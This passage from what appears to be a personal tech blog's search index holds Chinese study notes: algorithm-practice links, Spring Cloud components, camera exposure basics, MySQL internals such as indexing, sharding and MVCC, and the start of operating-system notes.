🗡☞offer https://blog.csdn.net/qq_30277239/category_8713779_2.html\n算法提高课 https://blog.csdn.net/qq_30277239/category_9672147_2.html\n大厂笔试 网易2021\nhttps://www.nowcoder.com/questionTerminal/592a069811044d3fadb94c6c55d7b4f2\nComparable和Comparator区别是什么？\nhttp/2相比http/1.1有什么新特性？\nSTL map 红黑树\n在map内部所有的数据都是有序的\n1 2 3 4 5 6  map\u0026lt;int,int\u0026gt; m1; for(auto x:m1){  if(x.second==1){  cout\u0026lt;\u0026lt;m2[x.first]\u0026lt;\u0026lt;endl;  } }   DP https://www.acwing.coml/blog/content/7459/\nhttps://oi-wiki.org/string/trie/\nhttps://space.bilibili.com/517494241?spm_id_from=333.788.b_765f7570696e666f.2\n上下左右走 最长上升子序列模型 背包模型 状态机模型 连通性状态压缩dp 集合类状态压缩 区间dp 树形dp 数位dp 单调队列优化dp 斜率优化dp 搜索 Flood Fill https://blog.csdn.net/weixin_42979819/article/details/104020930 https://blog.csdn.net/weixin_42638946/article/details/114854833\nBFS综合 https://blog.csdn.net/weixin_42638946/article/details/114905541\n最短路模型 https://www.acwing.com/solution/content/2078/ https://blog.csdn.net/weixin_43798170/article/details/113819433 https://www.acwing.com/problem/content/190/ https://blog.csdn.net/qq_30277239/article/details/104680308\n多源bfs https://www.acwing.com/problem/content/175/\n最小步数模型 https://www.acwing.com/problem/content/847/ https://www.acwing.com/problem/content/1109/\n双端队列广搜 https://www.acwing.com/problem/content/177/\nA* https://www.acwing.com/problem/content/180/ https://www.acwing.com/problem/content/181/\nDFS综合 https://blog.csdn.net/weixin_42638946/article/details/114993465\nDFS连通性模型 https://www.cnblogs.com/WAsbry/p/12836812.html https://blog.csdn.net/qq_45927003/article/details/112845344\nDFS搜索顺序 https://blog.csdn.net/weixin_45480785/article/details/113802964\nhttps://blog.csdn.net/m0_46656833/article/details/116027525\nhttps://blog.csdn.net/qq_30277239/article/details/104799213\nDFS剪枝与优化 https://www.acwing.com/problem/content/168/ https://www.acwing.com/problem/content/167/ https://www.acwing.com/problem/content/169/ https://www.acwing.com/problem/content/170/\n迭代加深 https://www.acwing.com/problem/content/172/\n双向dfs https://www.acwing.com/problem/content/173/\nIDA* https://www.acwing.com/problem/content/182/ https://www.acwing.com/problem/content/183/\n基础知识 双指针算法 https://blog.csdn.net/suxiaorui/article/details/106222438 https://blog.csdn.net/qq_30277239/article/details/100877076\n位运算 https://www.acwing.com/problem/content/description/92/ https://blog.csdn.net/weixin_43681549/article/details/113872488\n离散化 https://blog.csdn.net/weixin_43681549/article/details/113872897\nRMQ https://blog.csdn.net/qq_46105170/article/details/119861243\n区间合并 https://www.acwing.com/solution/content/2615/\n数据结构 单链表 https://www.acwing.com/problem/content/828/\n双链表 https://www.acwing.com/problem/content/829/\n栈 https://www.cnblogs.com/ITduange/p/14457644.html\n队列 https://www.cnblogs.com/ITduange/p/14457676.html\n单调栈 https://blog.csdn.net/YSA__/article/details/107499102\n单调队列 https://www.acwing.com/problem/content/156/\nKMP https://www.acwing.com/solution/content/14666/\nTrie https://www.acwing.com/problem/content/145/\nhttps://www.acwing.com/solution/content/14695/\n并查集 https://www.acwing.com/problem/content/description/838/\nhttps://blog.csdn.net/YSA__/article/details/107696344\nhttps://blog.csdn.net/qq_52358098/article/details/114220210\nhttps://blog.csdn.net/qq_52358098/article/details/114221482\nhttps://www.acwing.com/problem/content/239/\nhttps://www.acwing.com/problem/content/240/\nhttps://www.acwing.com/problem/content/241/\nhttps://www.acwing.com/problem/content/242/\n堆 https://www.acwing.com/problem/content/108/\nhttps://www.acwing.com/problem/content/840/\nhttps://blog.csdn.net/YSA__/article/details/108416108\n哈希表 https://blog.csdn.net/YSA__/article/details/108437830\nhttps://www.acwing.com/solution/content/24738/\n树状数组 https://www.acwing.com/problem/content/243/\nhttps://www.acwing.com/problem/content/244/\nhttps://www.acwing.com/problem/content/248/\nhttps://www.acwing.com/problem/content/245/\n线段树 https://www.acwing.com/problem/content/244/\nhttps://www.acwing.com/problem/content/246/\nhttps://www.acwing.com/problem/content/247/\nhttps://www.acwing.com/problem/content/249/\nhttps://blog.csdn.net/zzq0523/article/details/113183214\nhttps://blog.csdn.net/qq_52358098/article/details/117306705\n可持久化数据结构 https://www.acwing.com/problem/content/257/\nhttps://www.acwing.com/problem/content/258/\n平衡树 https://www.acwing.com/problem/content/255/\nhttps://www.acwing.com/problem/content/267/\nAC自动机 https://blog.csdn.net/weixin_43798170/article/details/114273860\nhttps://www.acwing.com/solution/content/56098/\nhttps://www.acwing.com/solution/content/7760/\n图论 单源最短路初级 https://www.acwing.com/solution/content/9306/\nhttps://www.acwing.com/problem/content/851/\nhttps://www.acwing.com/problem/content/852/\nhttps://www.acwing.com/problem/content/853/\nhttps://www.acwing.com/problem/content/855/\nhttps://blog.csdn.net/qq_44791484/article/details/116587679\nhttps://www.acwing.com/problem/content/1129/\nhttps://blog.csdn.net/qq_30277239/article/details/106104598\nhttps://blog.csdn.net/qq_30277239/article/details/106106290\nhttps://www.acwing.com/problem/content/922/\nhttps://www.acwing.com/problem/content/905/\n单源最短路中级 https://www.acwing.com/problem/content/342/\nhttps://www.acwing.com/problem/content/343/\nhttps://www.acwing.com/problem/content/344/\nhttps://blog.csdn.net/qq_30277239/article/details/106317639\n单源最短路高级 https://blog.csdn.net/qq_30277239/article/details/106864304\nhttps://www.acwing.com/problem/content/385/\nhttps://blog.csdn.net/qq_30277239/article/details/106819891\nhttps://blog.csdn.net/qq_30277239/article/details/106743915\n负环 https://blog.csdn.net/qq_30277239/article/details/101060037\nhttps://www.acwing.com/problem/content/363/\nhttps://blog.csdn.net/qq_30277239/article/details/108330375\nhttps://blog.csdn.net/qq_30277239/article/details/108436287\n差分约束 https://www.acwing.com/problem/content/364/\nhttps://www.acwing.com/problem/content/395/\nhttps://blog.csdn.net/qq_30277239/article/details/108966877 牛\nhttps://blog.csdn.net/qq_30277239/article/details/109248159\nFloyd https://blog.csdn.net/qq_30277239/article/details/101062266\nhttps://www.acwing.com/problem/content/345/\nhttps://www.acwing.com/problem/content/346/\nhttps://www.acwing.com/problem/content/347/\nhttps://blog.csdn.net/qq_30277239/article/details/107301496\n最小生成树初级 最基础的prim和kruskal\nhttps://blog.csdn.net/qq_30277239/article/details/101064096\nhttps://blog.csdn.net/qq_30277239/article/details/101066119\n较简单\nhttps://blog.csdn.net/qq_30277239/article/details/107891523\nhttps://blog.csdn.net/qq_30277239/article/details/107898613\n小技巧（最小生成树的最大边；有一些边是必选的，就输入时处理；点阵连通，不用构图，直接用性质\nhttps://blog.csdn.net/qq_30277239/article/details/107899568\nhttps://blog.csdn.net/qq_30277239/article/details/107899955\nhttps://blog.csdn.net/qq_30277239/article/details/107900698\n最小生成树中级 https://www.acwing.com/problem/content/348/\nhttps://blog.csdn.net/qq_30277239/article/details/108184284\nhttps://blog.csdn.net/qq_30277239/article/details/108038467\nhttps://blog.csdn.net/qq_30277239/article/details/108033213\nhttps://blog.csdn.net/qq_30277239/article/details/108190012\n欧拉回路 https://blog.csdn.net/weixin_42638946/article/details/115432734\n拓扑排序 https://blog.csdn.net/weixin_42638946/article/details/115442368\n最近公共祖先 https://blog.csdn.net/weixin_42638946/article/details/115321434\n有向图强连通分量 https://blog.csdn.net/weixin_42638946/article/details/115385877 牛\nhttps://blog.csdn.net/qq_30277239/article/details/118683637\nhttps://blog.csdn.net/qq_30277239/article/details/118880405\nhttps://www.acwing.com/problem/content/370/\n无向图双连通分量 https://blog.csdn.net/weixin_42638946/article/details/115413418 牛\nhttps://www.acwing.com/problem/content/397/\nhttps://www.acwing.com/problem/content/398/\n染色体法 and匈牙利算法 二分图 https://blog.csdn.net/weixin_42638946/article/details/115422539\n数学知识 质数 https://blog.csdn.net/weixin_42638946/article/details/115703334\n约数 https://blog.csdn.net/weixin_42638946/article/details/115706223\n快速幂 https://blog.csdn.net/weixin_42638946/article/details/115716902\n欧拉函数 https://blog.csdn.net/weixin_42638946/article/details/115708467\n扩展欧几里得算法 https://blog.csdn.net/weixin_42638946/article/details/115719532\n中国剩余定理 https://blog.csdn.net/weixin_42638946/article/details/115728340\n矩阵乘法 https://blog.csdn.net/weixin_42638946/article/details/115872469\n高斯消元 https://blog.csdn.net/weixin_42638946/article/details/115736209\n组合数 https://blog.csdn.net/weixin_42638946/article/details/115751984\n容斥原理 https://blog.csdn.net/weixin_42638946/article/details/115764996\n概率与数学期望 https://www.acwing.com/problem/content/219/\nhttps://www.acwing.com/problem/content/220/\n模拟退火 https://blog.csdn.net/weixin_42638946/article/details/120817011\n博弈论 https://blog.csdn.net/weixin_42638946/article/details/115772126\n","permalink":"https://kevinerr.github.io/posts/algorithm/acwing/","summary":"找出数组中重复的元素 n个数（每个数的取值范围是1到n-1） https://www.acwing.com/solution/content/707/ 把每个数放到它原本的位置上去O(n),O(1),数组发生了改变 https://www.acwing.com/solution/content/693/ 抽屉原理二分法，","title":"acwing"},{"content":"Eureka Spring Cloud Eureka是Spring Cloud Netflix 子项目的核心组件之一，主要用于微服务架构中的服务治理。本文将对搭建Eureka注册中心，搭建Eureka客户端，搭建Eureka集群及给Eureka注册中心添加登录认证进行介绍。\n在微服务架构中往往会有一个注册中心，每个微服务都会向注册中心去注册自己的地址及端口信息，注册中心维护着服务名称与服务实例的对应关系。每个微服务都会定时从注册中心获取服务列表，同时汇报自己的运行情况，这样当有的服务需要调用其他服务时，就可以从自己获取到的服务列表中获取实例地址进行调用，Eureka实现了这套服务注册与发现机制。\n由于所有服务都会注册到注册中心去，服务之间的调用都是通过从注册中心获取的服务列表来调用，注册中心一旦宕机，所有服务调用都会出现问题。所以我们需要多个注册中心组成集群来提供服务，下面将搭建一个双节点的注册中心集群。\nRibbon Spring Cloud Ribbon 是Spring Cloud Netflix 子项目的核心组件之一，主要给服务间调用及API网关转发提供负载均衡的功能，本文将对其用法进行详细介绍。\n在微服务架构中，很多服务都会部署多个，其他服务去调用该服务的时候，如何保证负载均衡是个不得不去考虑的问题。负载均衡可以增加系统的可用性和扩展性，当我们使用RestTemplate来调用其他服务时，Ribbon可以很方便的实现负载均衡功能。 RestTemplate是一个HTTP客户端，使用它我们可以方便的调用HTTP接口，支持GET、POST、PUT、DELETE等方法。 所谓的负载均衡策略，就是当A服务调用B服务时，此时B服务有多个实例，这时A服务以何种方式来选择调用的B实例，ribbon可以选择以下几种负载均衡策略。\nHystrix Spring Cloud Hystrix 是Spring Cloud Netflix 子项目的核心组件之一，具有服务容错及线程隔离等一系列服务保护功能，本文将对其用法进行详细介绍。\n在微服务架构中，服务与服务之间通过远程调用的方式进行通信，一旦某个被调用的服务发生了故障，其依赖服务也会发生故障，此时就会发生故障的蔓延，最终导致系统瘫痪。Hystrix实现了断路器模式，当某个服务发生故障时，通过断路器的监控，给调用方返回一个错误响应，而不是长时间的等待，这样就不会使得调用方由于长时间得不到响应而占用线程，从而防止故障的蔓延。Hystrix具备服务降级、服务熔断、线程隔离、请求缓存、请求合并及服务监控等强大功能。\n@HystrixCommand中的常用参数 fallbackMethod：指定服务降级处理方法； ignoreExceptions：忽略某些异常，不发生服务降级； commandKey：命令名称，用于区分不同的命令； groupKey：分组名称，Hystrix会根据不同的分组来统计命令的告警及仪表盘信息； threadPoolKey：线程池名称，用于划分线程池。\nHystrix的请求缓存 当系统并发量越来越大时，我们需要使用缓存来优化系统，达到减轻并发请求线程数，提供响应速度的效果。 @CacheResult：开启缓存，默认所有参数作为缓存的key，cacheKeyMethod可以通过返回String类型的方法指定key； @CacheKey：指定缓存的key，可以指定参数或指定参数中的属性值为缓存key，cacheKeyMethod还可以通过返回String类型的方法指定； @CacheRemove：移除缓存，需要指定commandKey。\n请求合并 微服务系统中的服务间通信，需要通过远程调用来实现，随着调用次数越来越多，占用线程资源也会越来越多。Hystrix中提供了@HystrixCollapser用于合并请求，从而达到减少通信消耗及线程数量的效果。 batchMethod：用于设置请求合并的方法； collapserProperties：请求合并属性，用于控制实例属性，有很多； timerDelayInMilliseconds：collapserProperties中的属性，用于控制每隔多少时间合并一次请求；\nFeign Spring Cloud OpenFeign 是声明式的服务调用工具，它整合了Ribbon和Hystrix，拥有负载均衡和服务容错功能，本文将对其用法进行详细介绍。\nFeign是声明式的服务调用工具，我们只需创建一个接口并用注解的方式来配置它，就可以实现对某个服务接口的调用，简化了直接使用RestTemplate来调用服务接口的开发量。Feign具备可插拔的注解支持，同时支持Feign注解、JAX-RS注解及SpringMvc注解。当使用Feign时，Spring Cloud集成了Ribbon和Eureka以提供负载均衡的服务调用及基于Hystrix的服务容错保护功能。\nZuul Spring Cloud Zuul 是Spring Cloud Netflix 子项目的核心组件之一，可以作为微服务架构中的API网关使用，支持动态路由与过滤功能，本文将对其用法进行详细介绍。\nAPI网关为微服务架构中的服务提供了统一的访问入口，客户端通过API网关访问相关服务。API网关的定义类似于设计模式中的门面模式，它相当于整个微服务架构中的门面，所有客户端的访问都通过它来进行路由及过滤。它实现了请求路由、负载均衡、校验过滤、服务容错、服务聚合等功能。\n过滤器 路由与过滤是Zuul的两大核心功能，路由功能负责将外部请求转发到具体的服务实例上去，是实现统一访问入口的基础，过滤功能负责对请求过程进行额外的处理，是请求校验过滤及服务聚合的基础。 pre：在请求被路由到目标服务前执行，比如权限校验、打印日志等功能； routing：在请求被路由到目标服务时执行，这是使用Apache HttpClient或Netflix Ribbon构建和发送原始HTTP请求的地方； post：在请求被路由到目标服务后执行，比如给目标服务的响应添加头信息，收集统计数据等功能； error：请求在其他阶段发生错误时执行。 由于Zuul自动集成了Ribbon和Hystrix，所以Zuul天生就有负载均衡和服务容错能力，我们可以通过Ribbon和Hystrix的配置来配置Zuul中的相应功能。\n","permalink":"https://kevinerr.github.io/posts/tech/springcloud/","summary":"Eureka Spring Cloud Eureka是Spring Cloud Netflix 子项目的核心组件之一，主要用于微服务架构中的服务治理。本文将对搭建Eureka注册中心，搭建Eureka","title":"springcloud"},{"content":"快门速度、iso以及光圈数值 快门速度：相机左下角的参数就是快门速度，指快门打开到闭合所需要的时间。快门速度越快，你定格的时间越短，比如：快门速度越快，你就可以定格住运动的物体；相反，快门速度越慢，运动物体会糊掉，快门速度会影响曝光，也就是对照片的亮度有影响 光圈：镜头的字母F后面的就是光圈数值，这个数字越小，光圈越大，虚化效果也越好，也越容易剁手。 ISO：可以比作相机内部的一个手电筒，开得太高，会出现噪点，要注意哦。\n焦段 长焦压缩 背景和人物看上去更近\n35mm 广角 背景多点 显脸大\n50mm 55mm最适合拍摄 我想说的是，实际上很多女摄影师都非常喜欢24mm定焦拍的人像，虽然确实是有畸变，但是面部五官也立体了，长焦扁平压缩背景的同时也扁平了人脸。大家可以去试试24mm拍出来的直出图给摸特看看，特别是竖拍图，保证模特大多数都会喜欢\n单反转盘模式说明 1.A+档：根据场景设置，自动调节对焦、亮度、色调，还能调出使用闪光灯（完全由相机自己觉得照片质量） 2.P档：自动设置快门光圈值，也可手动设置 3.S/TV档：快门优先自动曝光，可调节快门速度，使物体显得静止或动感，此模式下只需要设置好快门速度，相机程序会自动调节好光圈大小，比较适合高速运动物体抓拍。（由于无法控制光圈大小，所以无法控制景深） 4.A档：和S档相反，光圈优先自动曝光，快门根据光圈大小得出适当数值，适合拍摄景物（如果光圈很小，快门也会变的很慢，没有三脚架，画面易变模糊） 5.M档：手动曝光，手动设置快门、光圈、ISO、白平衡等所有数值（但是要想拍出满意的照片，需要尝试很多次） 6.B门：快门调到最慢，快门的数字会变成B门，快门时间取决于按快门持续的时间（适合拍车流、星轨，需要搭配三脚架和快门线使用）\n互易律 通过上面的实验你就会发现，在同等光线环境下，光圈小1档，快门慢1档位，ISO不动，画面的亮度是不会变了，这就是互易律。\n光圈、快门、感光度，这三者中的任意一个或者两个朝明或暗调节了N档，另外的两个或者一个朝着反方向调节N档位，整体曝光不变。\n","permalink":"https://kevinerr.github.io/posts/life/%E6%91%84%E5%BD%B1/","summary":"快门速度、iso以及光圈数值 快门速度：相机左下角的参数就是快门速度，指快门打开到闭合所需要的时间。快门速度越快，你定格的时间越短，比如：快门","title":"摄影"},{"content":"MySQL结构体系 https://cloud.tencent.com/developer/article/1857505\n数据库引擎 MyISAM：表锁，并发量较小，不支持事务，不支持外键（性能更优，占用的存储空间少，MYISAM拥有全文索引的功能，这可以极大地优化LIKE查询的效率，查询性能高）\nInnoDB：行锁，并发量较大，支持事务，支持外键。是聚集索引，使用B加Tree作为索引结构。\n 如果要执行大量 select 操作，应该选择 MyISAM 如果要执行大量 insert 和 update 操作，应该选择 InnoDB 大尺寸的数据集趋向于选择 InnoDB 引擎，因为它支持事务处理和故障恢复。数据库的大小决定了故障恢复的时间长短，InnoDB 可以利用事务日志进行数据恢复，这会比较快。主键查询在 InnoDB 引擎下也会相当快，不过需要注意的是如果主键太长也会导致性能问题。  Tips 安装mysql 一般用压缩包安装，而不用exe安装\nmysql是数据库管理系统\n锁 mysql锁\n行锁与表锁\n当插入数据时，就锁定表，这叫做”锁表”；当更新数据时，就锁定行，这叫做”锁行”。\nmysql的行锁是基于索引加载的\n表锁响应的是非索引字段，即全表扫描，\n更新数据库数据时，如果没有触发索引，则会锁表，锁表后再对表做任何变更操作都会导致锁冲突，所以表锁的锁冲突概率较高。\n连表查询 7种 用基础的3种left join、right join、inner join搞定7种\nMySQL的两张表的七种Join查\n自连接 自连接查询就是以类似多表对比的方式，实现对同一张表内数据进行复杂的关系表示或关系处理。\n自连接查询\n子查询 子查询\nMySQL函数 常用函数\n聚合函数\nMD5加密\nSQL语句书写 1 2 3 4 5 6 7 8  DESC `cms_help` --显示表的结构 SHOW CREATE TABLE `cms_help` --查看创建数据表的语句 SHOW CREATE DATABASE `mall` --查看创建数据库的语句 ALTER --对表的列进行操作 TRUNCATE TABLE \u0026#39;test\u0026#39; DELETE FROM \u0026#39;test\u0026#39; --都能删除数据,不会删除表结构，TRUNCATE重新设置自增类，计数器归零，不会影响事务 SELECT DISTINCT --去重   DELETE删除的问题，重启数据库\nInnoDB 自增从1开始（存在内存中，断电即失）\nMyISAM 继续上一个自增（存在文件中，不会丢失）\nmodify不能用来字段重命名\nchange不能修改字段类型和约束\n外键一般用程序是实现，一切外键概念必须在应用层解决\n分页limit 起始值 页面的大小和排序order by asc/desc\n分库分表 垂直分库 垂直分库是指按照业务将表进行分类，分布到不同的数据库上面，每个库可以放在不同的服务器上，它的核心理念是专库专用。\n它带来的提升是：\n 解决业务层面的耦合，业务清晰 能对不同业务的数据进行分级管理、维护、监控、扩展等 高并发场景下，垂直分库一定程度的提升IO、数据库连接数、降低单机硬件资源的瓶颈  业务场景：原有的SELLER_DB(卖家库)，分为了PRODUCT_DB(商品库)和STORE_DB(店铺库)，并把这两个库分散到不同服务器\n水平分库 水平分库是把同一个表的数据按一定规则拆到不同的数据库中，每个库可以放在不同的服务器上。\n它带来的提升是：\n 解决了单库大数据，高并发的性能瓶颈。 提高了系统的稳定性及可用性。  业务场景：经过垂直分库后，数据库性能问题得到一定程度的解决，但是随着业务量的增长，PRODUCT_DB(商品库)单库存储数据已经超出预估。粗略估计，目前有8w店铺，每个店铺平均150个不同规格的商品，再算上增长，那商品数量得往1500w+上预估，并且PRODUCT_DB(商品库)属于访问非常频繁的资源，单台服务器已经无法支撑。此时该如何优化？尝试水平分库，将店铺ID为单数的和店铺ID为双数的商品信息分别放在两个库中。\n垂直分表 垂直分表定义：将一个表按照字段分成多表，每个表存储其中一部分字段。\n用户在浏览商品列表时，只有对某商品感兴趣时才会查看该商品的详细描述。因此，商品信息中商品描述字段访问频次较低，且该字段存储占用空间较大，访问单个数据IO时间较长；商品信息中商品名称、商品图片、商品价格等其他字段数据访问频次较高。\n由于这两种数据的特性不一样，因此他考虑将商品信息表拆分如下：\n将访问频次低的商品描述信息单独存放在一张表中，访问频次较高的商品基本信息单独放在一张表中\n它带来的提升是：\n1.为了避免IO争抢并减少锁表的几率，查看详情的用户与商品信息浏览互不影响\n2.充分发挥热门数据的操作效率，商品信息的操作的高效率不会被商品描述的低效率所拖累。\n通常我们按以下原则进行垂直拆分:\n1 把不常用的字段单独放在一张表;\n2 把text，blob等大字段拆分出来放在附表中;\n3 经常组合查询的列放在一张表中;\n水平分表 水平分表是在同一个数据库内，把同一个表的数据按一定规则拆到多个表中。\n它带来的提升是：\n 优化单一表数据量过大而产生的性能问题 避免IO争抢并减少锁表的几率  业务场景：按照水平分库的思路对他把PRODUCT_DB_X(商品库)内的表也可以进行水平拆分，其目的也是为解决单表数据量大的问题\n主从复制，读写分离 主从复制原理（数据层面的东西）\n在不同的服务器上配置数据库，并通过修改配置文件构成主从复制\n读写分离（shardingJDBC：业务层面的东西）\n读只会使用2台从服务器\n写只会在主服务器\n分库分表查询语句会查询所有库和所有表的数据\nshardingJDBC还提供分布式事务\n1 2 3 4 5 6 7  分库分表后，本地事务已经不能保证事务，需要分布式事务 ## 本地事务 @Transactional（rollbackFor = Exception.class） ## Sharding提供的分布式事务 ## 扣钱--\u0026gt;强一致性 ； 订单 --\u0026gt; 弱一致性，柔性 @Transactional（rollbackFor = Exception.class） @ShardingTransactionType(TransactionType.XA)   事务以及隔离级别 事务是一系列操作的集合，这些操作要么都做，要么都不做，是一个不可分割的工作单位，是数据库环境中的最小工作单元。 事务（原子性（Atomicity，或称不可分割性）、一致性（Consistency）、隔离性（Isolation，又称独立性）、持久性（Durability）） 创建一个名为transfer1的显式事务，该事务将学生李勇校园卡账户上的500元转到张立的校园卡账户上，然后用select语句查看campus_card表检查是否转账成功。要求：（1）先基于学生姓名获得其学号信息；（2）转账前需要先检查李勇的校园卡账户是否有足够的待转金额，如果若李勇账户余额不足则打印输出‘余额不足，不能转账.’然后将该事务回滚。\n事务ACID理解\n索引（有序数组、Hash、二叉搜索树、B+树） MySQL索引背后的数据结构及算法原理\n创建索引可以大大提高系统的性能。 第一，通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性。 第二，可以大大加快 数据的检索速度，这也是创建索引的最主要的原因。\n创建索引和维护索引要耗费时间，这种时间随着数据 量的增加而增加。 第二，索引需要占物理空间\n主键索引 顾名思义该类索引由表的主键组成，从左到右由小到大排序。一个 Innodb 存储表只有一张主键索引表（聚集索引）。 普通索引 最为平常的一种索引，没有特别限制。 唯一索引 该索引的字段不能有相同值，但允许有空值。 组合索引 由多列字段组合而成的索引，往往是为了提升查询效率而设置。 聚集索引就是按照每张表的主键构造一棵 B+树，叶子节点存放的是表的完整行记录。非聚集索引的叶子节点不包含行记录的全部数据。Innodb 存储引擎的非聚集索引的叶子节点的内容为主键索引值。\n索引不是越多越好\n不要对经常变动的数据加索引\n小数据量的表不需要加索引\n索引一般加在常用来查询的字段上\n函数或表达式会使索引失效\n最左前缀原理（查询条件没有指定索引第一列，用不到索引；询条件用到了索引中列的精确匹配，但是中间某个条件未提供，会出现“坑”；通配符%不出现在开头，则可以用到索引，但根据具体情况不同可能只会用其中一个前缀）\n使用辅助索引或“隔离列”的优化方法，将emp_no与from_date之间的“坑”填上。\n范围列可以用到索引（必须是最左前缀），但是范围列后面的列无法用到索引\n“BETWEEN”实际上相当于“IN”是多值匹配，谨慎地区分多值匹配和范围匹配\n索引的选择性（Selectivity），是指不重复的索引值（也叫基数，Cardinality）与表记录数（#T）的比值，择性的取值范围为(0, 1]，选择性越高的索引价值越大\n前缀索引兼顾索引大小和查询速度，但是其缺点是不能用于ORDER BY和GROUP BY操作，也不能用于Covering index（即当索引本身包含查询所需全部数据时，不再访问数据文件本身）。\n在使用InnoDB存储引擎时，如果没有特别的需要，请永远使用一个与业务无关的自增字段作为主键。\n存储过程 性能好；将常用或复杂的工作预先用 SQL 语句写好并用一个指定名称存储起来，这个过程经编译和优化后存储在数据库服务器中，因此称为存储过程。 exec 执行存储过程\n触发器 响应一个特殊表格中的某些事件而自动执行的程序代码 触发器是一种特殊类型的存储过程，不由用户直接调用。创建触发器时会对其进行定义，以便在对特定表或列作特定类型的数据修改时执行。 保证数据完整性的一种方法 DML触发器(Insert,delete,update)、DDL(create,drop,alter)触发器和登录触发器 当用户从course表删除元组时检查被删除元组的课程号（cno）是否在学生选课表sc中出现过，如果出现过说明该课程已被学生选，为了保证数据库的完整性，这时应该将表sc中对应该课程号的选课信息给删除。 过多的触发器使得数据逻辑变得复杂。触发器的功能逐渐在代码逻辑或事务中替代实现，更符合OO思想。建议：使用触发器需慎重。\n视图 视图是一个虚拟的表，是一个表中的数据经过某种筛选后的显示方式，视图由一个预定义的查询select语句组成； 特点：视图中的数据并不属于视图本身；视图的数量没有限制，但是命名不能和视图以及表重复，具有唯一性。视图可以被嵌套，一个视图中可以嵌套另一个视图。 视图不能索引，不能有相关联的触发器和默认值 好处：①简化数据操作：视图可以简化用户处理数据的方式。 ②着重于特定数据：不必要的数据或敏感数据可以不出现在视图中。 ③视图提供了一个简单而有效的安全机制，可以定制不同用户对数据的访问权限。\n数据库设计 1、需求分析：了解用户的数据需求、处理需求、安全性及完整性要求； 2、概念设计：通过数据抽象，设计系统概念模型，一般为E-R模型； 3、逻辑结构设计：设计系统的模式和外模式，对于关系模型主要是基本表和视图； 4、物理结构设计：设计数据的存储结构和存取方法，如索引的设计； 5、系统实施：组织数据入库、编制应用程序、试运行； 6、运行维护：系统投入运行，长期的维护工作。\n范式 关系型数据库设计：三大范式的通俗理解\n 第一范式：要求数据库表的每一列都是不可分割的原子数据项。 第二范式：（2NF）属性完全依赖于主键 第三范式：（3NF）属性不依赖于其它非主属性，在2NF基础上消除传递依赖 BCNF 在第三范式的基础上，数据库表中如果不存在任何字段对任一候选关键字段的传递函数依赖。  数据迁移 情景:把一个数据库的一些表迁移到另外一个新的数据库的表中. 同时, 在迁移过程中, 修改一些数据. 此处, 修改数据, 举几个例子:\n Y/N, Yes/No 改成 TRUE/FALSE 添加一些新列, 并填充默认值 原来的列, 名字全部修改. 比如 Event ID 改成 XXEvent ID 筛选归类. 比如原来某列的数据是1-100的分数, 迁移后数据转换成\u0026quot;不及格\u0026quot;(\u0026lt;60),\u0026ldquo;及格\u0026rdquo;(60\u0026lt;x\u0026lt;70), 优良..等等 拆分原来的列. 原来的列里日期数据是DD/MM/YYYY HH:mm:ss, 拆成两列, 一列是MM/DD/YYYY, 另一列是HH:mm:ss 等等等等 现在只能拿到 CSV 格式数据. 一个 CSV 是一个表格, 有很多很多表格. 一个表格大概4W 到40W 行不等. 光是一个 CSV 大小,就有100来兆. 请问除了用 excel, 有什么好的办法或者软件或者服务可以处理? 数据迁移工具  SQL注入 preparedstatement防止sql注入的本质，把传递进来的参数当作字符\n假设其中存在转义字符，比如说‘会被直接转义\n数据库连接池 聊聊索引失效？失效的原因是什么？ InnoDB 存储引擎：B+ 树索引的叶子节点保存数据本身\n索引 B+ 树是按照「索引值」有序排列存储的，只能根据前缀进行比较。只能根据前缀进行比较。\n1、左模糊匹配：前缀都是模糊的，排序了也没有，需要全表扫描\n2、有计算表达式：id+1=10，它只排序id的值，而不排序id+1，虽然这个优化比较好做，但估计不做，为啥呢？自个揣摩\n3、有mysql内置函数：length(name)=6，它只排序name的值，而不排序length(name)\n4、聚合索引：比如（a,b,c）它是在排序a的基础上再排序b再排序c，如果只过滤b、c，那也需要全表扫描\n5、索引隐式转换：MySQL 在遇到字符串和数字比较的时候，会自动把字符串转为数字，然后再进行比较。\n比如你一个phone 字段存的是varchar 但过滤时传的是数字，那么mysql就会自行将 where phone = 1300000001转换成CAST(phone AS signed int) = 1300000001; 此情形就和3一样了\n6、有or字段；假设过滤的条件一个是主键，一个是普通列。由于or的含义只有一个条件列是索引列是没有意义的，只要有条件列不是索引列，就会进行全表扫描。\nhttps://juejin.cn/post/7056640917016412197\nMysql-MVCC多版本并发控制详解 MVCC，全称Multi-Version Concurrency Control，即多版本并发控制。\nmvcc 是多版本并发控制，通过生成记录的历史版本解决幻读问题，并提高数据库的性能，无锁实现读写并发操作。\nmvcc 的实现主要是通过三个隐藏字段，undo log以及readView 实现的。\n三个隐藏字段分别是隐藏主键，事务ID，回滚指针。\nundo log是各个事务修改同一条记录的时候生成的历史记录，方便回滚，同时会生成一条版本链。\nreadView是事务在进行快照读的时候生成的记录快照，用于判断数据的可见性。\nreadView 可见性判断规则。\nhttps://juejin.cn/post/7020422614552150052\n","permalink":"https://kevinerr.github.io/posts/tech/%E6%95%B0%E6%8D%AE%E5%BA%93/","summary":"MySQL结构体系 https://cloud.tencent.com/developer/article/1857505 数据库引擎 MyISAM：表锁，并发量较小，不支持事务，不支持外键（性能更优，占用的存储空间少，MYISAM拥有全文索引的","title":"数据库"},{"content":"https://blog.csdn.net/weixin_43914604/article/details/104415990\n第 1 章 计算机系统概述 1.1 操作系统的基本概念 1.1.1 操作系统的概念、功能和目标（系统资源的管理者、提供接口、作为扩充机器、虚拟机） https://blog.csdn.net/weixin_43914604/article/details/104408571\n1.1.2 操作系统的特征（并发、共享、虚拟、异步） https://blog.csdn.net/weixin_43914604/article/details/104416461\n1.2 操作系统的发展和分类 1.2.1 操作系统的发展和分类（手工、单道/多道批处理、分时、实时、网络、分布式、嵌入式、个人计算机） https://blog.csdn.net/weixin_43914604/article/details/104445449\n1.3 操作系统的运行机制和体系结构 1.3.1 操作系统的运行机制和体系结构（大内核、小内核） https://blog.csdn.net/weixin_43914604/article/details/104452762\n1.3.2 中断和异常（内中断和外中断、中断处理过程） https://blog.csdn.net/weixin_43914604/article/details/104462974\n中断为了实现多道程序并发执行的一种技术，为了提高资源利用率\n中断是cpu从用户进入核心态的唯一途径\n外中断的处理过程9步 关开关开\n1.3.3 系统调用（执行过程、访管指令、库函数与系统调用） 